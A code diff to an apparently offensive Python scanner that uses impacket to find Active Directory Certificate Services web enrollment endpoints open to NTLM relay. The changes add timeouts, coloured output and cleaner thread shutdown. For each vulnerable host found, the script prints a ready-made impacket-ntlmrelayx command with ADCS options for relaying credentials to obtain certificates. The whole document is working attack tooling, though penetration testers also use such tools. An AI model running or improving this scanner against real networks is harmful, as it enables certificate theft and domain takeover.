@@ -5,8 +5,16 @@ import ipaddress
 import os
 import requests
 import logging
+import socket
 from impacket import uuid
 from impacket.dcerpc.v5 import transport, epm
+
+# Set default socket timeout to 5 seconds
+socket.setdefaulttimeout(5)
+
+# ANSI color codes
+RED = '\033[91m'
+RESET = '\033[0m'
 
 # Initialize logging
 logging.basicConfig(level=logging.CRITICAL)  # Suppress all logging output
@@ -19,7 +27,7 @@ vulnerable_targets_lock = threading.Lock()
 def make_http_request(ip):
     url = f"http://{ip}/certsrv/certfnsh.asp"
     try:
-        response = requests.get(url, timeout=10)
+        response = requests.get(url, timeout=5)  # Reduced timeout to 5 seconds
         if response.status_code == 401 and "Access is denied" in response.text:
             return True, None  # Indicates potential vulnerability
         else:
@@ -40,13 +48,6 @@ def parse_input_line(line):
     except ValueError:
         # Line is not an IP address or CIDR, assume it's a hostname
         return [line]
-
-def is_valid_ip(input_string):
-    try:
-        ipaddress.ip_address(input_string)
-        return True
-    except ValueError:
-        return False
 
 class RPCDump:
     KNOWN_PROTOCOLS = {
@@ -92,7 +93,16 @@ class RPCDump:
         return entries
 
     def __fetchList(self, rpctransport):
+        # Set a timeout on the transport
+        try:
+            rpctransport.set_connect_timeout(5)  # Set transport timeout to 5 seconds
+        except AttributeError:
+            pass  # Not all transports support this method
         dce = rpctransport.get_dce_rpc()
+        try:
+            dce.set_rpc_timeout(5)  # Set RPC timeout to 5 seconds
+        except AttributeError:
+            pass  # Not all DCE/RPC connections support this method
         dce.connect()
         resp = epm.hept_lookup(None, dce=dce)
         dce.disconnect()
@@ -102,6 +112,7 @@ def worker(ip_queue, progress):
     while True:
         ip = ip_queue.get()
         if ip is None:
+            ip_queue.task_done()
             break
 
         # Initialize a list to accumulate messages
@@ -140,7 +151,7 @@ def worker(ip_queue, progress):
 
                         is_vulnerable, _ = make_http_request(ip)
                         if is_vulnerable:
-                            output_messages.append(f"Vulnerable Web Enrollment endpoint found: http://{ip}/certsrv/certfnsh.asp\n")
+                            output_messages.append(f"{RED}Vulnerable Web Enrollment endpoint found: http://{ip}/certsrv/certfnsh.asp{RESET}\n")
                             # Add the vulnerable target to the list
                             with vulnerable_targets_lock:
                                 vulnerable_targets.append(ip)
@@ -152,14 +163,14 @@ def worker(ip_queue, progress):
                 pass  # No endpoints found; do not output
         except Exception:
             pass  # Suppress exceptions to reduce verbose output
+        finally:
+            # Print all messages at once
+            with print_lock:
+                print('\n'.join(output_messages))
 
-        # Print all messages at once
-        with print_lock:
-            print('\n'.join(output_messages))
-
-        with progress.get_lock():
-            progress.value += 1
-        ip_queue.task_done()
+            with progress.get_lock():
+                progress.value += 1
+            ip_queue.task_done()
 
 def run_rpcdump_concurrently(ip_list):
     num_worker_threads = 10
@@ -179,7 +190,6 @@ def run_rpcdump_concurrently(ip_list):
     threads = []
     for _ in range(num_worker_threads):
         t = threading.Thread(target=worker, args=(ip_queue, progress))
-        t.daemon = True
         t.start()
         threads.append(t)
 
@@ -188,6 +198,13 @@ def run_rpcdump_concurrently(ip_list):
             ip_queue.put(ip.strip())
 
         ip_queue.join()
+
+        # Signal threads to exit
+        for _ in range(num_worker_threads):
+            ip_queue.put(None)
+        for t in threads:
+            t.join()
+
     except KeyboardInterrupt:
         for _ in range(num_worker_threads):
             ip_queue.put(None)
@@ -221,12 +238,12 @@ def main():
         # After scanning is complete, output the command if vulnerabilities were found
         if vulnerable_targets:
             with print_lock:
-                print("\nVulnerable targets found:")
+                print(f"\n{RED}Vulnerable targets found:{RESET}")
                 for target in vulnerable_targets:
                     print(f" - {target}")
-                print("\nYou can use the following command(s):")
+                print(f"\nYou can use the following command(s):")
                 for target in vulnerable_targets:
-                    print(f"impacket-ntlmrelayx -t http://{target}/certsrv/certfnsh.asp -smb2support --adcs --template 'user'")
+                    print(f"{RED}impacket-ntlmrelayx -t http://{target}/certsrv/certfnsh.asp -smb2support --adcs --template 'user'{RESET}")
         else:
             with print_lock:
                 print("\nNo vulnerable targets were found.")
